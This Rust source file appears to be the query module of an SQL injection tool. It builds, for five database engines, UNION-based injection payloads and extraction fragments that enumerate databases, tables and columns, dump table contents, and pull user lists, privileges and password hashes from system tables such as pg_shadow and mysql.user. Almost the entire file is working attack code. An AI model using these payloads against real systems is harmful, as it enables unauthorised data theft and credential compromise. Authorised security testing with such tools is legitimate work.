//! Database-specific SQL queries for extraction
//!
//! Provides correct syntax for MySQL, PostgreSQL, MSSQL, Oracle, SQLite

use crate::sqli::DatabaseType;

/// Get DBMS version query
pub fn version_query(db: DatabaseType) -> String {
    match db {
        DatabaseType::MySQL => "VERSION()".to_string(),
        DatabaseType::PostgreSQL => "VERSION()".to_string(),
        DatabaseType::MSSQL => "@@VERSION".to_string(),
        DatabaseType::Oracle => "banner FROM v$version WHERE ROWNUM=1--".to_string(),
        DatabaseType::SQLite => "sqlite_version()".to_string(),
        DatabaseType::Unknown => "VERSION()".to_string(),
    }
}

/// Get current user query
pub fn current_user_query(db: DatabaseType) -> String {
    match db {
        DatabaseType::MySQL => "USER()".to_string(),
        DatabaseType::PostgreSQL => "CURRENT_USER".to_string(),
        DatabaseType::MSSQL => "SYSTEM_USER".to_string(),
        DatabaseType::Oracle => "USER FROM DUAL--".to_string(),
        DatabaseType::SQLite => "'sqlite_user'".to_string(),
        DatabaseType::Unknown => "USER()".to_string(),
    }
}

/// Get current database query
pub fn current_db_query(db: DatabaseType) -> String {
    match db {
        DatabaseType::MySQL => "DATABASE()".to_string(),
        DatabaseType::PostgreSQL => "CURRENT_DATABASE()".to_string(),
        DatabaseType::MSSQL => "DB_NAME()".to_string(),
        DatabaseType::Oracle => "SYS.DATABASE_NAME FROM DUAL--".to_string(),
        DatabaseType::SQLite => "'main'".to_string(),
        DatabaseType::Unknown => "DATABASE()".to_string(),
    }
}

/// Get hostname query
pub fn hostname_query(db: DatabaseType) -> String {
    match db {
        DatabaseType::MySQL => "@@HOSTNAME".to_string(),
        DatabaseType::PostgreSQL => "INET_SERVER_ADDR()".to_string(),
        DatabaseType::MSSQL => "@@SERVERNAME".to_string(),
        DatabaseType::Oracle => "UTL_INADDR.GET_HOST_NAME FROM DUAL--".to_string(),
        DatabaseType::SQLite => "'localhost'".to_string(),
        DatabaseType::Unknown => "@@HOSTNAME".to_string(),
    }
}

/// Get all databases query
pub fn databases_query(db: DatabaseType) -> String {
    match db {
        DatabaseType::MySQL => {
            "schema_name FROM information_schema.schemata".to_string()
        }
        DatabaseType::PostgreSQL => {
            "datname FROM pg_database WHERE datistemplate=false".to_string()
        }
        DatabaseType::MSSQL => {
            "name FROM master.dbo.sysdatabases".to_string()
        }
        DatabaseType::Oracle => {
            "DISTINCT owner FROM all_tables".to_string()
        }
        DatabaseType::SQLite => {
            "name FROM pragma_database_list".to_string()
        }
        DatabaseType::Unknown => {
            "schema_name FROM information_schema.schemata".to_string()
        }
    }
}

/// Get tables in database query
pub fn tables_query(db: DatabaseType, database: &str) -> String {
    match db {
        DatabaseType::MySQL => {
            format!(
                "table_name FROM information_schema.tables WHERE table_schema='{}'",
                database
            )
        }
        DatabaseType::PostgreSQL => {
            format!(
                "tablename FROM pg_tables WHERE schemaname='{}'",
                database
            )
        }
        DatabaseType::MSSQL => {
            format!(
                "name FROM {}.sys.tables",
                database
            )
        }
        DatabaseType::Oracle => {
            format!(
                "table_name FROM all_tables WHERE owner='{}'",
                database.to_uppercase()
            )
        }
        DatabaseType::SQLite => {
            "name FROM sqlite_master WHERE type='table'".to_string()
        }
        DatabaseType::Unknown => {
            format!(
                "table_name FROM information_schema.tables WHERE table_schema='{}'",
                database
            )
        }
    }
}

/// Get columns in table query
pub fn columns_query(db: DatabaseType, database: &str, table: &str) -> String {
    match db {
        DatabaseType::MySQL => {
            format!(
                "column_name FROM information_schema.columns WHERE table_schema='{}' AND table_name='{}'",
                database, table
            )
        }
        DatabaseType::PostgreSQL => {
            format!(
                "column_name FROM information_schema.columns WHERE table_schema='{}' AND table_name='{}'",
                database, table
            )
        }
        DatabaseType::MSSQL => {
            format!(
                "name FROM {}.sys.columns WHERE object_id=OBJECT_ID('{}.{}')",
                database, database, table
            )
        }
        DatabaseType::Oracle => {
            format!(
                "column_name FROM all_tab_columns WHERE owner='{}' AND table_name='{}'",
                database.to_uppercase(), table.to_uppercase()
            )
        }
        DatabaseType::SQLite => {
            format!(
                "name FROM pragma_table_info('{}')",
                table
            )
        }
        DatabaseType::Unknown => {
            format!(
                "column_name FROM information_schema.columns WHERE table_schema='{}' AND table_name='{}'",
                database, table
            )
        }
    }
}

/// Generate dump query for table
pub fn dump_query(db: DatabaseType, database: &str, table: &str, columns: &[String]) -> String {
    let cols = columns.join(",");
    
    match db {
        DatabaseType::MySQL | DatabaseType::PostgreSQL | DatabaseType::Unknown => {
            format!("{} FROM {}.{}", cols, database, table)
        }
        DatabaseType::MSSQL => {
            format!("{} FROM {}.dbo.{}", cols, database, table)
        }
        DatabaseType::Oracle => {
            format!("{} FROM {}.{}", cols, database.to_uppercase(), table.to_uppercase())
        }
        DatabaseType::SQLite => {
            format!("{} FROM {}", cols, table)
        }
    }
}

/// Get database users query
pub fn users_query(db: DatabaseType) -> String {
    match db {
        DatabaseType::MySQL => {
            "user FROM mysql.user".to_string()
        }
        DatabaseType::PostgreSQL => {
            "usename FROM pg_user".to_string()
        }
        DatabaseType::MSSQL => {
            "name FROM sys.sql_logins".to_string()
        }
        DatabaseType::Oracle => {
            "username FROM all_users".to_string()
        }
        DatabaseType::SQLite => {
            "'n/a'".to_string()
        }
        DatabaseType::Unknown => {
            "user FROM mysql.user".to_string()
        }
    }
}

/// Get password hashes query
pub fn passwords_query(db: DatabaseType) -> String {
    match db {
        DatabaseType::MySQL => {
            "user,authentication_string FROM mysql.user".to_string()
        }
        DatabaseType::PostgreSQL => {
            "usename,passwd FROM pg_shadow".to_string()
        }
        DatabaseType::MSSQL => {
            "name,password_hash FROM sys.sql_logins".to_string()
        }
        DatabaseType::Oracle => {
            "username,password FROM dba_users".to_string()
        }
        DatabaseType::SQLite => {
            "'n/a','n/a'".to_string()
        }
        DatabaseType::Unknown => {
            "user,authentication_string FROM mysql.user".to_string()
        }
    }
}

/// Get user privileges query
pub fn privileges_query(db: DatabaseType) -> String {
    match db {
        DatabaseType::MySQL => {
            "grantee,privilege_type FROM information_schema.user_privileges".to_string()
        }
        DatabaseType::PostgreSQL => {
            "grantee,privilege_type FROM information_schema.role_table_grants".to_string()
        }
        DatabaseType::MSSQL => {
            "name,type_desc FROM sys.server_principals".to_string()
        }
        DatabaseType::Oracle => {
            "grantee,privilege FROM dba_sys_privs".to_string()
        }
        DatabaseType::SQLite => {
            "'n/a','n/a'".to_string()
        }
        DatabaseType::Unknown => {
            "grantee,privilege_type FROM information_schema.user_privileges".to_string()
        }
    }
}

/// Get number of columns in target query (for UNION detection)
pub fn column_count_payloads() -> Vec<String> {
    (1..=20)
        .map(|n| {
            let nulls = (0..n).map(|_| "NULL").collect::<Vec<_>>().join(",");
            format!("' UNION SELECT {}-- ", nulls)
        })
        .collect()
}

/// Generate UNION payload for extraction
pub fn union_payload(column_count: usize, position: usize, query: &str) -> String {
    let mut parts: Vec<&str> = (0..column_count).map(|_| "NULL").collect();
    if position < parts.len() {
        // We'll replace this with the actual query result
        parts[position] = "CONCAT(0x7e7e7e,({query}),0x7e7e7e)";
    }
    
    // Build the payload - actual query will be injected
    let select_part = parts.join(",");
    format!("' UNION SELECT {} FROM dual-- ", select_part)
        .replace("({query})", &format!("(SELECT {} LIMIT 1)", query))
}

/// Markers for extracting data from response
pub const EXTRACT_MARKER_START: &str = "~~~";
pub const EXTRACT_MARKER_END: &str = "~~~";

/// Wrap query result with markers for easy extraction
pub fn wrap_with_markers(query: &str) -> String {
    format!("CONCAT('{}',{},'{}')", EXTRACT_MARKER_START, query, EXTRACT_MARKER_END)
}

/// MySQL-specific concat for multiple values
pub fn mysql_group_concat(column: &str) -> String {
    format!("GROUP_CONCAT({} SEPARATOR ',')", column)
}

/// PostgreSQL-specific string aggregation
pub fn pg_string_agg(column: &str) -> String {
    format!("STRING_AGG({}::text, ',')", column)
}

/// MSSQL-specific string aggregation  
pub fn mssql_string_agg(column: &str) -> String {
    format!("STRING_AGG({}, ',')", column)
}

